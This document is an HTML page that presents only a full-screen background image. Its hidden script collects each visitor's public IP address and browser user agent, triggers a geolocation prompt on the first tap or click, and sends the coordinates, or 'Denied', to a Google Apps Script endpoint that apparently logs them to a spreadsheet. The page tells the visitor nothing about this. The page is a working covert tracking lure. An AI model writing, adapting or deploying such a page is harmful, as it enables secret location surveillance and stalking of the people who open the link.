<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      background: url("https://cdn5.myhostdata.space/uploads/2025/11/28/cbba0b8136803bea504437be28f5284c/thumb/0-img_20251128_230800_316.webp") 
                  no-repeat center center fixed;
      background-size: cover;
    }
  </style>
</head>
<body>

<script>
// UNIQUE ID
function generateID() {
  return 'id-' + Math.random().toString(36).substr(2, 9);
}

let payload = {
  id: generateID(),
  timestamp: new Date().toISOString(),
  ip: "",
  lat: "",
  lon: "",
  browser: navigator.userAgent
};

// GET IP FIRST
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => {
    payload.ip = data.ip;
  });

// -------- MOBILE FIX --------
// FIRST TOUCH WILL TRIGGER LOCATION POPUP
let firstTouch = false;

function requestLocationOnce() {
  if (firstTouch) return;
  firstTouch = true;

  navigator.geolocation.getCurrentPosition(
    pos => {
      payload.lat = pos.coords.latitude;
      payload.lon = pos.coords.longitude;
      sendToGoogle();
    },
    err => {
      payload.lat = "Denied";
      payload.lon = "Denied";
      sendToGoogle();
    }
  );
}

// Works on all mobile browsers
document.addEventListener("touchstart", requestLocationOnce, { once: true });
document.addEventListener("click", requestLocationOnce, { once: true });
// -------------------------------------

// SEND TO GOOGLE SHEET
function sendToGoogle() {
  fetch("https://script.google.com/macros/s/AKfycbz8fPnuKwQj5h4eqPONdlvEkG_OjeC1dsdAYMyAW5_R_anIXeLW-d8lGGDSAeXRPOXk/exec", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}
</script>

</body>
</html>
